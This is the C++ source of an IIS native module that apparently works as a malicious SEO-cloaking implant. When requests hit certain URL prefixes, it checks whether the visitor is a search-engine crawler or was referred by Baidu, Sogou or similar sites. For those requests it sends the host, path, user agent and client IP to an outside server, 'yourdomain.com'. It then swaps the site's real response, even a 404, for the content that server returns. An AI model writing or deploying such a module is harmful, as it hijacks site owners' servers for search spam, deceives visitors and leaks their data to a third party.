#include "pch.h"
#include "IIS.h"

void IISHttpModule::DebugMessage(TCHAR* szFormat, ...)
{
#ifdef _DEBUG
	TCHAR szBuf[1024];
	va_list list;
	va_start(list, szFormat);
	vsprintf(szBuf, szFormat, list);
	WriteFileLogMessage(szBuf);
	//WriteEventLogMessage(szBuf);
	va_end(list);
#endif
}

bool IISHttpModule::WriteFileLogMessage(TCHAR* szMsg)
{
	bool status = FALSE;
	HANDLE hFile = CreateFile(_T("C:\\ProgramData\\1.log"), GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE != hFile)
	{
		DWORD dwWritten;
		SetFilePointer(hFile, 0, NULL, FILE_END);
		WriteFile(hFile, szMsg, lstrlen(szMsg), &dwWritten, NULL);
		WriteFile(hFile, _T("\r\n"), 2, &dwWritten, NULL);
		CloseHandle(hFile);
		status = TRUE;
	}
	return status;
}

bool
IISHttpModule::WriteEventLogMessage(TCHAR* szMsg)
{
	bool status = FALSE;
	if ((NULL != m_hEventLog) && (NULL != szMsg))
	{
		status = ReportEvent(m_hEventLog, EVENTLOG_INFORMATION_TYPE, 0, 0, NULL, 1, 0, (LPCSTR*)szMsg, NULL);
	}
	return status;
}


REQUEST_NOTIFICATION_STATUS
IISHttpModule::OnBeginRequest(IN IHttpContext* pHttpContext, IN IHttpEventProvider* pProvider) // ULI Changed
{
	HRESULT hr = S_OK;

	IHttpRequest* pRequest = pHttpContext->GetRequest();
	if (NULL != pRequest)
	{
		TCHAR* pszHeaderValue = NULL;
		USHORT cchHeaderValue = 0;
		pszHeaderValue = (TCHAR*)pRequest->GetHeader(GetHeaderName(), &cchHeaderValue);
		m_pszHeaderValue[0] = 0x00; 

		if (cchHeaderValue > 0)
		{
			pszHeaderValue = (TCHAR*)pHttpContext->AllocateRequestMemory(cchHeaderValue + 1);
			if (NULL == pszHeaderValue)
			{
				// Set the error status
				hr = HRESULT_FROM_WIN32(ERROR_NOT_ENOUGH_MEMORY);
				pProvider->SetErrorStatus(hr);
			}
		}
		USHORT cchUAValue = 0;
		USHORT ErrorCode = 404;
	}
	if (FAILED(hr))
	{
		return RQ_NOTIFICATION_FINISH_REQUEST;
	}
	else
	{
		return RQ_NOTIFICATION_CONTINUE;
	}
}


REQUEST_NOTIFICATION_STATUS
IISHttpModule::OnSendResponse(IN IHttpContext* pHttpContext, IN ISendResponseProvider* pProvider)
{
	HRESULT hr = S_OK;

	DebugMessage(_T("(OSR) = OnSendResponse"));

	IHttpRequest* pRequest = pHttpContext->GetRequest();
	IHttpResponse* pResponse = pHttpContext->GetResponse();
	USHORT cchHeaderValue = 0;
	if (TRUE == pProvider->GetReadyToLogData())
	{
		TCHAR* ua = (TCHAR*)pRequest->GetHeader("User-Agent", &cchHeaderValue);
		HTTP_REQUEST* rawHttpRequest = pRequest->GetRawHttpRequest();
		PHTTP_LOG_FIELDS_DATA pLogData = (PHTTP_LOG_FIELDS_DATA)pProvider->GetLogData();
		TCHAR* CilentIP = "";
		TCHAR* Forwarded = "";
		Forwarded = (TCHAR*)pRequest->GetHeader("X-Forwarded-For", &cchHeaderValue);

		if (strlen(rawHttpRequest->pRawUrl) >= 4) {
			if (rawHttpRequest->pRawUrl[0] == '/') {
				char dir[18] = { 0 };
				strncpy(dir, rawHttpRequest->pRawUrl + 1, 3);
				char* dirs[] = { "doc", "poc", "hot", "ppx", "aoo", "cxk", "fok" , "wyf" , "app" , "lol", "ass","ycy","wsc","pk1","110","119","pxx" };
				for (int i = 0; i < sizeof(dirs) / sizeof(dirs[0]); i++) {
					if (strstr(dir, dirs[i]) > 0) {

						if (Forwarded != NULL && strlen(Forwarded) != 0) {
							CilentIP = Forwarded;
						}
						else {
							TCHAR* CilentIP = (TCHAR*)pLogData->ClientIp;
						}

						TCHAR* host = (TCHAR*)pRequest->GetHeader("Host", &cchHeaderValue);
						TCHAR* referer = (TCHAR*)pRequest->GetHeader("Referer", &cchHeaderValue);
						TCHAR* accept = (TCHAR*)pRequest->GetHeader("Accept", &cchHeaderValue);
						TCHAR* uc_ua = (TCHAR*)pRequest->GetHeader("HTTP_X_UCBROWSER_UA", &cchHeaderValue);
						std::string url = "http://yourdomain.com/api?domain=" + std::string(host) + "&path=" + std::string(rawHttpRequest->pRawUrl);
						std::string body = "";

						if (IsSpider(ua)) {
							body = HttpRequest(url, ua, accept, uc_ua, referer, CilentIP);
							//break;
						}
						else {
							if (referer != NULL && strlen(referer) != 0)
							{
								const char* referers[] = { "sogou", "hao", "so.com", "sm.cn", "baidu" };
								for (int i = 0; i < sizeof(referers) / sizeof(referers[0]); i++) {
									if (strstr(referer, referers[i]) > 0) {
										body = HttpRequest(url, ua, accept, uc_ua, referer, CilentIP);
										break;
									}
								}
							}
							else {
								hr = S_OK;
							}

						}
						HTTP_RESPONSE* pResponseStruct = pResponse->GetRawHttpResponse();

						if (body.length() == 0)
						{
							hr = pResponse->SetStatus(404, "Not Found", 0, S_OK, NULL);
						}
						else {
							pResponseStruct->StatusCode = 200;
							pResponse->SetHeader("Content-Type", "text/html", (USHORT)strlen("text/html"), TRUE);
							// 清理ASP.NET的404错误
							pResponse->Clear();
							// 修改内存区块
							HTTP_DATA_CHUNK dataChunk;
							dataChunk.DataChunkType = HttpDataChunkFromMemory;
							DWORD cbSent;
							dataChunk.FromMemory.pBuffer = (PVOID)body.c_str();
							dataChunk.FromMemory.BufferLength = strlen(body.c_str());
							hr = pResponse->WriteEntityChunks(&dataChunk, 1, FALSE, TRUE, &cbSent, FALSE);

							//return RQ_NOTIFICATION_CONTINUE; // IIS 继续处理
						}
					}
				}
			}
		}
	}
	if (FAILED(hr))
	{
		return RQ_NOTIFICATION_FINISH_REQUEST; // IIS停止对当前请求的处理
	}
	else
	{
		return RQ_NOTIFICATION_CONTINUE; // IIS继续处理 
	}
}
